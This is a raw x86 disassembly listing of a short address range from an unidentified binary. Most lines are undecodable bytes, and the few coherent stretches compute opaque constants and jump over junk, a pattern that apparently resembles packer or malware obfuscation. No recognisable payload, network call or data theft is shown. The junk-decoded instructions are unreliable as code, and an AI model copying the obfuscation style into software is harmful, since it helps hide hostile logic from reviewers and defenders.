  40f0d7:	mov    eax,0xa3205565
  40f0dc:	jb     0x40f0e6
  40f0de:	sti    
  40f0df:	dec    edx
  40f0e0:	mul    BYTE PTR [esi]
  40f0e2:	add    bh,dl
  40f0e4:	inc    ebp
  40f0e5:	jns    0x40f140
  40f0e7:	sbb    ah,0x67
  40f0ea:	out    0x84,al
  40f0ec:	xor    BYTE PTR [eax-0x12a9a218],dh
  40f0f2:	and    bl,BYTE PTR ds:0x343c2165
  40f0f8:	fisttp DWORD PTR [ebp+0x47]
  40f0fb:	push   ecx
  40f0fc:	add    al,0x53
  40f0fe:	dec    edx
  40f0ff:	ret    
  40f100:	inc    edi
  40f101:	cs xchg ebx,eax
  40f103:	loop   0x40f157
  40f105:	(bad)  
  40f106:	(bad)  
  40f107:	cs inc edi
  40f109:	cmp    BYTE PTR [edi+0x319edffb],bh
  40f10f:	xchg   al,ah
  40f111:	or     al,0x98
  40f113:	mov    BYTE PTR [edx],bh
  40f115:	test   BYTE PTR [ebp-0xbf0bcff],0x45
  40f11c:	in     al,dx
  40f11d:	and    bl,al
  40f11f:	jecxz  0x40f11d
  40f121:	lock ins BYTE PTR es:[edi],dx
  40f123:	dec    edx
  40f124:	test   al,0x49
  40f126:	imul   esp,esp,0x55443f99
  40f12c:	das    
  40f12d:	and    BYTE PTR [ebx+0x3f],al
  40f130:	fisttp QWORD PTR [ecx]
  40f132:	stc    
  40f133:	cld    
  40f134:	out    dx,eax
  40f135:	cs test ebx,eax
  40f138:	aas    
  40f139:	sub    bl,BYTE PTR [ebx+esi*4+0x2d93a78f]
  40f140:	(bad)  [esi+0x14]
  40f143:	xor    DWORD PTR ds:0x85f52f4f,edi
  40f149:	mov    al,ds:0x7c405a93
  40f14e:	lahf   
  40f14f:	dec    edi
  40f150:	into   
  40f151:	xchg   edi,eax
  40f152:	push   ds
  40f153:	cmp    al,0x58
  40f155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f156:	fs faddp st(4),st
  40f159:	sbb    BYTE PTR [esi],ah
  40f15b:	or     ecx,DWORD PTR [esp+ecx*4]
  40f15e:	test   BYTE PTR [ebx+0x8],ah
  40f161:	push   edx
  40f162:	retf   
  40f163:	gs addr16 out dx,al
  40f166:	(bad)  
  40f167:	sbb    eax,0x67643b9d
  40f16c:	ja     0x40f19c
  40f16e:	(bad)  
  40f16f:	adc    edx,DWORD PTR [edi+0x10]
  40f172:	cld    
  40f173:	xchg   DWORD PTR [ebx-0x43],edx
  40f176:	shr    DWORD PTR [edx-0x28],1
  40f179:	dec    DWORD PTR [edi]
  40f17b:	xlat   BYTE PTR ds:[ebx]
  40f17c:	xchg   edi,eax
  40f17d:	jb     0xde2140d4
  40f183:	sar    BYTE PTR [esi-0x17aff803],cl
  40f189:	dec    esi
  40f18a:	sbb    ch,BYTE PTR [ebp+esi*1+0x49528407]
  40f191:	cmp    dl,BYTE PTR [edi+0x267945a2]
  40f197:	push   ebx
  40f198:	xor    edx,DWORD PTR [ecx+ebp*8+0x54]
  40f19c:	adc    eax,0xf82df9ed
  40f1a1:	adc    ebp,DWORD PTR [eax-0x5f]
  40f1a4:	pop    ebp
  40f1a5:	dec    esi
  40f1a6:	sahf   
  40f1a7:	mov    eax,0xe399f44d
  40f1ac:	mov    BYTE PTR es:[edx-0x3f],al
  40f1b0:	loop   0x40f157
  40f1b2:	cmp    ecx,DWORD PTR [ecx]
  40f1b4:	inc    esi
  40f1b5:	idiv   BYTE PTR [eax-0x35e5bd28]
  40f1bb:	not    BYTE PTR [edx+0x5a456d18]
  40f1c1:	je     0x40f166
  40f1c3:	push   esp
  40f1c4:	jno    0x40f1c1
  40f1c6:	or     al,0x3b
  40f1c8:	imul   eax,DWORD PTR [edi-0x6006555d],0xffffffe2
  40f1cf:	enter  0x26b8,0xcc
  40f1d3:	pusha  
  40f1d4:	retf   0xf72c
  40f1d7:	pop    ebp
  40f1d8:	push   eax
  40f1d9:	push   ebx
  40f1da:	in     eax,dx
  40f1db:	xchg   ebp,eax
  40f1dc:	cmp    DWORD PTR [ebx-0xa3993e6],ebp
  40f1e2:	jmp    0xd5043a0f
  40f1e7:	gs push sp
  40f1ea:	sbb    al,0x78
  40f1ec:	inc    edi
  40f1ed:	test   BYTE PTR [edi-0x49012f1a],bl
  40f1f3:	xor    eax,0x4fc0245a
  40f1f8:	xchg   DWORD PTR [ebx-0x6c7c94a3],edx
  40f1fe:	jmp    0xa4555dc1
  40f203:	out    0x3a,eax
  40f205:	sub    BYTE PTR [edx],dh
  40f207:	cmp    al,0xb1
  40f209:	imul   esp,edi,0xffffffeb
  40f20c:	sub    BYTE PTR [ebx-0x75],bh
  40f20f:	sub    BYTE PTR [ebx+0x50fb25ae],0xa1
  40f216:	out    dx,eax
  40f217:	fldenv [edi-0x2d]
  40f21a:	pop    esi
  40f21b:	(bad)  
  40f21c:	mov    bl,0x62
  40f21e:	enter  0x7fc6,0x23
  40f222:	dec    esp
  40f223:	shl    BYTE PTR [esi],cl
  40f225:	jmp    0x808347ac
  40f22a:	xor    eax,0x3ee7ddf3
  40f22f:	add    esi,DWORD PTR [esi]
  40f231:	fidiv  DWORD PTR [edi+ebp*4-0x18]
  40f235:	mov    dh,0x83
  40f237:	sub    DWORD PTR [ebx+0x66],esp
  40f23a:	cmp    DWORD PTR ds:0x4f219709,ebx
  40f240:	fcmovnbe st,st(5)
  40f242:	test   BYTE PTR [esi],cl
  40f244:	imul   ebp,DWORD PTR [ecx],0xffffffe4
  40f247:	mov    ebp,0xbc6a6843
  40f24c:	inc    edi
  40f24d:	shl    ebp,0xeb
  40f250:	repz adc BYTE PTR [esi-0x2c],dh
  40f254:	cmp    eax,0x7333024
  40f259:	sahf   
  40f25a:	cwde   
  40f25b:	cli    
  40f25c:	add    BYTE PTR [edi-0x176f7716],ah
  40f262:	out    0x7,al
  40f264:	xchg   esp,eax
  40f265:	retf   0x6396
  40f268:	pop    edi
  40f269:	mov    dh,0x40
  40f26b:	ret    
  40f26c:	ficomp DWORD PTR [edx+0x3ffe9351]
  40f272:	call   0xfd37cafc
  40f277:	out    dx,al
  40f278:	bound  ebp,QWORD PTR [ebx+0x6678c2c]
  40f27e:	push   ecx
  40f27f:	enter  0xe6c3,0xcf
  40f283:	out    dx,eax
  40f284:	cmp    al,0x82
  40f286:	lea    ebp,[esi]
  40f288:	sub    al,0xf6
  40f28a:	mov    edi,0xb81df2d8
  40f28f:	add    DWORD PTR ds:0x53c57154,eax
  40f295:	adc    eax,0xec151dfa
  40f29a:	fwait
  40f29b:	sti    
  40f29c:	xor    al,0xc8
  40f29e:	daa    
  40f29f:	or     al,0xbd
  40f2a1:	cmc    
  40f2a2:	push   esi
  40f2a3:	dec    ebp
  40f2a4:	cli    
  40f2a5:	(bad)  
  40f2a8:	mov    ds:0x53cb6346,al
  40f2ad:	dec    ebp
  40f2ae:	pop    eax
  40f2af:	sub    eax,0x34332d74
  40f2b4:	scas   al,BYTE PTR es:[edi]
  40f2b5:	mov    cl,0x7c
  40f2b7:	sub    eax,0x646aef81
  40f2bc:	loope  0x40f26b
  40f2be:	in     al,0xb5
  40f2c0:	imul   edx,DWORD PTR gs:[esi],0x14
  40f2c4:	mov    esi,0xa7e623c8
  40f2c9:	push   0x7b
  40f2cb:	inc    eax
  40f2cc:	pop    ebp
  40f2cd:	sti    
  40f2ce:	clc    
  40f2cf:	or     DWORD PTR [esi-0x899239],0xfffffff5
  40f2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2d7:	pop    esp
  40f2d8:	in     al,0x12
  40f2da:	dec    esp
  40f2db:	into   
  40f2dc:	fsubr  DWORD PTR [edx]
  40f2de:	push   ebp
  40f2df:	inc    edi
  40f2e0:	(bad)  
  40f2e1:	fisttp WORD PTR [ecx]
  40f2e3:	mov    edi,0x63ce5931
  40f2e8:	rol    DWORD PTR [ebx],cl
  40f2ea:	or     ecx,DWORD PTR [esi-0x6]
  40f2ed:	sub    BYTE PTR [ebp-0x77],dl
  40f2f0:	mov    dl,0xea
  40f2f2:	jmp    0x40f328
  40f2f4:	scas   al,BYTE PTR es:[edi]
  40f2f5:	add    al,0x9
  40f2f7:	loopne 0x40f2d5
  40f2f9:	xor    BYTE PTR [esi],dl
  40f2fb:	test   BYTE PTR [ebx-0x6630e13b],al
  40f301:	jbe    0x40f364
  40f303:	out    dx,eax
  40f304:	cwde   
  40f305:	enter  0xc970,0x8d
  40f309:	mov    ebp,DWORD PTR [ebp-0x29bcebcd]
  40f30f:	xlat   BYTE PTR ds:[ebx]
  40f310:	mov    ds:0x42d13a1b,al
  40f315:	shr    dh,cl
  40f317:	lods   al,BYTE PTR ds:[esi]
  40f318:	add    eax,0xd12ac11f
  40f31d:	push   0x4f418b6f
  40f322:	mov    dl,0xb3
  40f324:	outs   dx,BYTE PTR ds:[esi]
  40f325:	or     BYTE PTR [eax+0x70],0x2
  40f329:	lahf   
  40f32a:	mov    ebp,0x7c52e4ac
  40f32f:	(bad)  
  40f330:	stc    
  40f331:	xchg   ecx,eax
  40f332:	int3   
  40f333:	stos   DWORD PTR es:[edi],eax
  40f334:	sahf   
  40f335:	cmp    eax,0x651ef21f
  40f33a:	retf   
  40f33b:	leave  
  40f33c:	adc    cl,BYTE PTR [ebx+0x39]
  40f33f:	(bad)  
  40f340:	pop    esi
  40f341:	dec    esp
  40f342:	mov    eax,0x3422323e
  40f347:	out    0x6b,al
  40f349:	loope  0x40f316
  40f34b:	ins    DWORD PTR es:[edi],dx
  40f34c:	fldz   
  40f34e:	mov    eax,ds:0xc95b5e44
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x5c
  40f384:	dec    eax
  40f385:	lea    esi,[eax+0x2b]
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi+0x6e181814],bh
  40f390:	lahf   
  40f391:	fild   QWORD PTR [esi]
  40f393:	shl    BYTE PTR ds:0xe4a4543e,cl
  40f399:	cmp    eax,0xdf4bae5b
  40f39e:	jg     0x40f3b6
  40f3a0:	cmp    dl,BYTE PTR [ecx-0x33238f2e]
  40f3a6:	call   0x6cff:0x420d7135
  40f3ad:	dec    edi
  40f3ae:	dec    edi
  40f3af:	cmp    eax,0x8313f293
  40f3b4:	mov    ds:0xe84a20fe,eax
  40f3b9:	les    eax,FWORD PTR [edi+0x7cdeeff7]
  40f3bf:	mov    esi,0x4dbf0d6e
  40f3c4:	adc    ebx,edx
  40f3c6:	shl    BYTE PTR [esi-0x4f59aa45],0x44
  40f3cd:	dec    DWORD PTR [ebx+0x20547065]
  40f3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3d4:	fs pop ss
  40f3d6:	mov    al,0xad
  40f3d8:	dec    ecx
  40f3d9:	mov    dh,0xae
  40f3db:	and    BYTE PTR [esi-0x20dc2c6e],ah
  40f3e1:	adc    cl,BYTE PTR [esi+0x1920281]
  40f3e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3e8:	sbb    eax,0x656b25b5
  40f3ed:	and    ebx,DWORD PTR [ecx-0x717feccc]
  40f3f3:	sbb    eax,0x5a4c4df9
  40f3f8:	mov    al,ds:0xecab3ee7
  40f3fd:	dec    ebx
  40f3fe:	cmp    edi,DWORD PTR [eax-0x77]
  40f401:	and    cl,bh
  40f403:	clc    
  40f404:	add    eax,0xb198ea50
  40f409:	xchg   DWORD PTR [edi+0x2fb3591c],ebp
  40f40f:	cmp    al,0x74
  40f411:	jle    0x40f3f6
  40f413:	sub    DWORD PTR [edx],ebp
  40f415:	in     al,0x86
  40f417:	scas   eax,DWORD PTR es:[edi]
  40f418:	leave  
  40f419:	out    dx,eax
  40f41a:	sub    esp,ecx
  40f41c:	jb     0x40f420
  40f41e:	outs   dx,DWORD PTR ds:[esi]
  40f41f:	or     DWORD PTR [esi-0x4f],ecx
  40f422:	adc    al,0x8c
  40f424:	inc    esi
  40f425:	in     eax,0xe8
  40f427:	aaa    
  40f428:	sub    al,0xa8
  40f42a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f42b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f42d:	inc    edx
  40f42e:	pop    ebx
  40f42f:	(bad)  
  40f430:	nop
  40f431:	mov    eax,0x7e4a3068
  40f436:	and    dl,BYTE PTR [esi+0x13fe3332]
  40f43c:	or     dh,BYTE PTR [esi]
  40f43e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f43f:	push   ecx
  40f440:	jno    0x40f45d
  40f442:	add    esp,edi
  40f444:	pop    ebp
  40f445:	xchg   BYTE PTR gs:[eax+0x665c6b05],ch
  40f44c:	mov    dl,0x5d
  40f44e:	mov    al,0x23
  40f450:	mov    edi,0xf2c7784c
  40f455:	adc    bh,dh
  40f457:	mov    cl,0x36
  40f459:	jmp    0x6e8c:0x2b005cee
  40f460:	mov    dh,0x87
  40f462:	mov    ah,0x55
  40f464:	push   eax
  40f465:	jg     0x40f471
  40f467:	sbb    DWORD PTR [ebx+0x66],esp
  40f46a:	mov    ebp,ds
  40f46c:	dec    edx
  40f46d:	dec    ebx
  40f46e:	xor    ebp,DWORD PTR [ebp+0x52ecaddc]
  40f474:	retf   
  40f475:	mov    ?,WORD PTR [edi-0x1809aa0]
  40f47b:	xchg   ebx,eax
  40f47c:	call   0x513f:0x3955cb83
  40f483:	(bad)  
  40f484:	sbb    al,dl
  40f486:	sub    BYTE PTR [ecx+0x3bc05170],0x99
  40f48d:	mov    ebp,0x7fa289b8
  40f492:	ficom  WORD PTR [eax+0x43372a02]
  40f498:	(bad)  
  40f499:	push   edi
  40f49a:	xor    bl,BYTE PTR [eax-0x30]
  40f49d:	fistp  WORD PTR [ebp+0x2e5092b1]
  40f4a3:	test   BYTE PTR [eax-0x1b],cl
  40f4a6:	add    ebx,DWORD PTR [edi+0x19]
  40f4a9:	test   ch,bh
  40f4ab:	dec    esp
  40f4ac:	(bad)  
  40f4ad:	sub    eax,0x7c2b42bc
  40f4b2:	sub    bl,BYTE PTR [ebx-0x2be1ef13]
  40f4b8:	jecxz  0x40f524
  40f4ba:	add    al,0xfb
  40f4bc:	push   cs
  40f4bd:	xor    BYTE PTR [eax+0x67a15886],dh
  40f4c3:	cmp    esp,DWORD PTR [ebx+eax*8]
  40f4c6:	jno    0x40f513
  40f4c8:	dec    edx
  40f4c9:	dec    ecx
  40f4ca:	mov    eax,ecx
  40f4cc:	nop
  40f4cd:	cmp    eax,0xe063afd0
  40f4d2:	push   esi
  40f4d3:	jmp    0x835d:0xb40a448a
  40f4da:	mov    edi,0x26f90244
  40f4df:	aaa    
  40f4e0:	scas   eax,DWORD PTR es:[edi]
  40f4e1:	xchg   esp,eax
  40f4e2:	fwait
  40f4e3:	xchg   DWORD PTR [edi],esp
  40f4e5:	fidivr WORD PTR [ebp-0xb]
  40f4e8:	in     eax,0xbf
  40f4ea:	hlt    
  40f4eb:	mov    eax,DWORD PTR [ecx]
  40f4ed:	xchg   BYTE PTR [edi-0x73],bh
  40f4f0:	scas   al,BYTE PTR es:[edi]
  40f4f1:	lods   al,BYTE PTR ds:[esi]
  40f4f2:	jb     0x40f488
  40f4f4:	push   0x10
  40f4f6:	ds push 0xffffffec
  40f4f9:	xchg   ebx,eax
  40f4fa:	adc    DWORD PTR [eax],0x44
  40f4fd:	adc    eax,ebx
  40f4ff:	xor    ebx,DWORD PTR [ebx+0x4d]
  40f502:	mov    ecx,0x4cfac9e2
  40f507:	ror    ebp,1
  40f509:	xchg   ebp,eax
  40f50a:	mov    bl,0x42
  40f50c:	xchg   ebp,esi
  40f50e:	jl     0x40f54e
  40f510:	and    ebx,DWORD PTR [eax]
  40f512:	and    BYTE PTR [ebp-0x5],dl
  40f515:	and    DWORD PTR [edx-0x51],ecx
  40f518:	xor    dl,BYTE PTR [ebp+0x67]
  40f51b:	int3   
  40f51c:	out    0xce,eax
  40f51e:	mov    ecx,0xa6d8c77f
  40f523:	(bad)  
  40f524:	fimul  WORD PTR [ebx-0x5b]
  40f527:	fstp   DWORD PTR [eax+0x18]
  40f52a:	adc    DWORD PTR [edi*4+0x6d1128d],0x1d
  40f532:	mov    eax,0x8890175a
  40f537:	xchg   DWORD PTR [esp],esp
  40f53a:	repz (bad) [eax+0x481b6477]
  40f541:	mov    ds:0x54c0ca98,eax
  40f546:	out    0xd2,eax
  40f548:	adc    dh,bl
  40f54a:	xchg   ebx,eax
  40f54b:	push   eax
  40f54c:	jb     0x40f52a
  40f54e:	loope  0x40f586
  40f550:	cmp    al,0xa3
  40f552:	jne    0x40f578
  40f554:	out    0x30,eax
  40f556:	xchg   esp,eax
  40f557:	cmc    
  40f558:	mov    WORD PTR [esi+0x7783de4c],es
  40f55e:	lds    ecx,FWORD PTR [eax-0x628a12df]
  40f564:	inc    edx
  40f565:	and    BYTE PTR [ecx+0x522105f8],cl
  40f56b:	ja     0x40f54e
  40f56d:	imul   ecx,DWORD PTR [edx-0xc],0xc668ea72
  40f574:	(bad)  
  40f577:	mov    ah,0x3d
  40f579:	inc    DWORD PTR [ebp-0x62]
  40f57c:	cmp    al,0xee
  40f57e:	sbb    dl,BYTE PTR [ecx]
  40f580:	lods   al,BYTE PTR ds:[esi]
  40f581:	rol    BYTE PTR [ebp-0x1a127fb4],cl
  40f587:	fimul  WORD PTR [edx+0x4fe5e45d]
  40f58d:	rcr    DWORD PTR [esi+0x45bd64d2],1
  40f593:	cdq    
  40f594:	adc    eax,0x18710a25
  40f599:	cld    
  40f59a:	pcmpgtd mm3,QWORD PTR [edx+0xb552f7]
  40f5a1:	dec    edx
  40f5a2:	push   ds
  40f5a3:	lock fwait
  40f5a5:	lods   al,BYTE PTR ds:[esi]
  40f5a6:	pop    ebx
  40f5a7:	or     BYTE PTR [eax+0x310c54af],cl
  40f5ad:	pop    es
  40f5ae:	add    dh,cl
  40f5b0:	push   ds
  40f5b1:	adc    ebx,eax
  40f5b3:	mov    fs,ebp
  40f5b5:	into   
  40f5b6:	cwde   
  40f5b7:	mov    eax,ds:0xfc536041
  40f5bc:	test   DWORD PTR [ebx-0x5e578ba1],esp
  40f5c2:	aam    0xc3
  40f5c4:	scas   al,BYTE PTR es:[edi]
  40f5c5:	pop    esp
  40f5c6:	fld    TBYTE PTR [edx+0x15]
  40f5c9:	xor    ebx,DWORD PTR [edx]
  40f5cb:	xlat   BYTE PTR ds:[ebx]
  40f5cc:	or     al,0x2
  40f5ce:	(bad)  
  40f5cf:	das    
  40f5d0:	push   0x36
  40f5d2:	push   esi
  40f5d3:	xchg   esi,eax
  40f5d4:	in     eax,0xfc
  40f5d6:	bound  ecx,QWORD PTR [edx]
  40f5d8:	inc    eax
  40f5d9:	clc    
  40f5da:	cdq    
  40f5db:	dec    edi
  40f5dc:	cmp    ah,BYTE PTR [eax]
  40f5de:	xchg   ecx,eax
  40f5df:	clc    
  40f5e0:	and    al,0x47
  40f5e2:	pop    ecx
  40f5e3:	ins    DWORD PTR es:[edi],dx
  40f5e4:	pop    eax
  40f5e5:	popf   
  40f5e6:	fs pop eax
  40f5e8:	pop    ss
  40f5e9:	mov    esp,DWORD PTR [edi+0x4]
  40f5ec:	cmp    ebp,esp
  40f5ee:	cs xor al,0xf6
  40f5f1:	sub    DWORD PTR [esi],ebx
  40f5f3:	pop    ecx
  40f5f4:	int    0xf1
  40f5f6:	ret    0x434f
  40f5f9:	(bad)  
  40f5fa:	(bad)  
  40f5fb:	mov    edx,0xcf780fd5
  40f600:	mov    dh,0x8
  40f602:	js     0x40f651
  40f604:	ror    BYTE PTR [eax-0x79],cl
  40f607:	out    0xda,eax
  40f609:	repnz not BYTE PTR [edx]
  40f60c:	retf   0xf18b
  40f60f:	adc    edx,DWORD PTR [ebp+eiz*1+0x6a]
  40f613:	xchg   ebx,eax
  40f614:	add    esp,DWORD PTR [edx-0x94d5dac]
  40f61a:	into   
  40f61b:	call   0xd31e8886
  40f620:	adc    bl,BYTE PTR [edx-0x1a]
  40f623:	(bad)  
  40f624:	mov    al,ds:0x17e3717a
  40f629:	mov    cl,0x8
  40f62b:	ins    BYTE PTR es:[edi],dx
  40f62c:	xlat   BYTE PTR ds:[ebx]
  40f62d:	xor    DWORD PTR [edi+ecx*8+0xf38236a],edx
  40f634:	das    
  40f635:	pop    es
  40f636:	adc    BYTE PTR [eax-0x3a69b77a],bl
  40f63c:	(bad)  
  40f63d:	in     al,0xac
  40f63f:	mov    dl,0x8b
  40f641:	dec    ebp
  40f642:	clc    
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422558
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42268c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x4f4e972b],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	rcr    DWORD PTR [esi+ebp*2],1
  40f734:	xor    esp,ebp
  40f736:	imul   esp,DWORD PTR [esi+0xa],0x6b15e1f3
  40f73d:	cli    
  40f73e:	nop
  40f73f:	sbb    BYTE PTR [ebp+0x67],bh
  40f742:	aas    
  40f743:	or     ebx,DWORD PTR [edi+0xd]
  40f746:	cdq    
  40f747:	test   al,0x38
  40f749:	xchg   DWORD PTR [ecx],ebx
  40f74b:	xchg   BYTE PTR ds:[edx],ah
  40f74e:	dec    ebx
  40f74f:	pop    ebx
  40f750:	jg     0x40f6d9
  40f752:	pop    ds
  40f753:	cmp    DWORD PTR [ebp-0x7c],edx
  40f756:	jmp    0x1540:0x6df81487
  40f75d:	ins    DWORD PTR es:[edi],dx
  40f75e:	es sub al,0x13
  40f761:	cmp    eax,0xd3b27e5
  40f766:	call   0xba6e:0xbb0297cc
  40f76d:	mov    esp,0x37025a2b
  40f772:	std    
  40f773:	shr    BYTE PTR ds:[ebx],cl
  40f776:	sub    DWORD PTR [ebp+0x3a],edi
  40f779:	or     DWORD PTR [edx+ebx*2],esi
  40f77c:	add    edx,DWORD PTR [edi]
  40f77e:	mov    eax,0x47399325
  40f783:	ins    BYTE PTR es:[edi],dx
  40f784:	jmp    FWORD PTR [edi+0x7d]
  40f787:	ss mov ebx,0x3d99bd61
  40f78d:	and    al,0xf7
  40f78f:	xor    BYTE PTR [esi+0x18bf1afb],0xa4
  40f796:	mov    eax,0x278b01c6
  40f79b:	loope  0x40f7d2
  40f79d:	dec    esi
  40f79e:	(bad)  
  40f79f:	push   esi
  40f7a0:	push   edi
  40f7a1:	pop    ebp
  40f7a2:	out    0xc,al
  40f7a4:	out    0x7e,eax
  40f7a6:	push   edi
  40f7a7:	push   0x1b
  40f7a9:	inc    ebx
  40f7aa:	lahf   
  40f7ab:	aas    
  40f7ac:	iret   
  40f7ad:	jge    0x40f81b
  40f7af:	repz sub cl,cl
  40f7b2:	add    edx,ecx
  40f7b4:	push   esi
  40f7b5:	scas   eax,DWORD PTR es:[edi]
  40f7b6:	lds    ebp,FWORD PTR [ecx]
  40f7b8:	fsubr  QWORD PTR [edi-0x7b7b5eb2]
  40f7be:	aas    
  40f7bf:	inc    ecx
  40f7c0:	stc    
  40f7c1:	(bad)  
  40f7c2:	sub    BYTE PTR [ecx-0x1081a23c],ch
  40f7c8:	call   0xf1b4:0x4d9cb9fc
  40f7cf:	cmp    eax,0xe5e5df5c
  40f7d4:	mov    eax,ds:0xb9d41cbf
  40f7d9:	push   esi
  40f7da:	mov    ds:0x10b44576,eax
  40f7df:	popf   
  40f7e0:	cmp    bh,al
  40f7e2:	test   BYTE PTR [ebp+edi*8-0x61],bh
  40f7e6:	xchg   edi,eax
  40f7e7:	dec    ebx
  40f7e8:	lods   al,BYTE PTR ds:[esi]
  40f7e9:	adc    eax,0xe9362f6c
  40f7ee:	int3   
  40f7ef:	adc    BYTE PTR [edi+edx*1+0xb80194d],bl
  40f7f6:	repnz nop
  40f7f8:	xchg   BYTE PTR [ecx+0x42],dh
  40f7fb:	fisub  WORD PTR [esi-0x53]
  40f7fe:	stos   DWORD PTR es:[edi],eax
  40f7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f800:	out    dx,al
  40f801:	clc    
  40f802:	bound  ecx,QWORD PTR [esi-0x1f2547f6]
  40f808:	dec    edi
  40f809:	cmp    BYTE PTR [esp+esi*4+0x73],cl
  40f80d:	push   edx
  40f80e:	pusha  
  40f80f:	ins    DWORD PTR es:[edi],dx
  40f810:	pop    ecx
  40f811:	mov    al,ds:0xd570c119
  40f816:	adc    eax,DWORD PTR ds:0x73e09a24
  40f81c:	adc    bl,ah
  40f81e:	shl    DWORD PTR [esi-0x4402b195],cl
  40f824:	push   ds
  40f825:	sbb    al,0xf6
  40f827:	pusha  
  40f828:	sub    ah,bl
  40f82a:	adc    BYTE PTR [ebx],ch
  40f82c:	push   ebx
  40f82d:	dec    esi
  40f82e:	int    0xa3
  40f830:	outs   dx,DWORD PTR ds:[esi]
  40f831:	pop    ecx
  40f832:	sbb    al,0xdf
  40f834:	pop    ss
  40f835:	lds    edi,FWORD PTR [eax+0x442a14e7]
  40f83b:	stc    
  40f83c:	outs   dx,BYTE PTR ds:[esi]
  40f83d:	add    ebx,DWORD PTR [edx-0x11]
  40f840:	mov    ds:0xb2483c2b,al
  40f845:	jg     0x40f8b4
  40f847:	dec    ebx
  40f848:	in     al,dx
  40f849:	icebp  
  40f84a:	ret    
  40f84b:	retf   
  40f84c:	(bad)  
  40f84d:	popf   
  40f84e:	mov    DWORD PTR [edi],ebx
  40f850:	sub    bh,BYTE PTR [edx-0x1a]
  40f853:	push   ebp
  40f854:	js     0x40f84a
  40f856:	cmp    eax,0x8397f6f
  40f85b:	jg     0x40f8a4
  40f85d:	push   esi
  40f85e:	inc    edx
  40f85f:	jno    0x40f7ee
  40f861:	ins    BYTE PTR es:[edi],dx
  40f862:	sti    
  40f863:	jmp    0x40f7f3
  40f865:	repz push 0x53b13dc1
  40f86b:	cld    
  40f86c:	pop    ds
  40f86d:	leave  
  40f86e:	push   0x4
  40f870:	inc    ebp
  40f871:	imul   edx,edx,0xc9399f26
  40f877:	outs   dx,BYTE PTR ds:[esi]
  40f878:	dec    esi
  40f879:	scas   al,BYTE PTR es:[edi]
  40f87a:	in     eax,0x2e
  40f87c:	adc    al,0x57
  40f87e:	cwde   
  40f87f:	test   BYTE PTR [ebp+ebp*8-0x18],0xb6
  40f884:	xlat   BYTE PTR ds:[ebx]
  40f885:	in     eax,dx
  40f886:	ja     0x40f874
  40f888:	jae    0x40f8cf
  40f88a:	das    
  40f88b:	pusha  
  40f88c:	ret    0x20ad
  40f88f:	add    eax,0x6e2b15c9
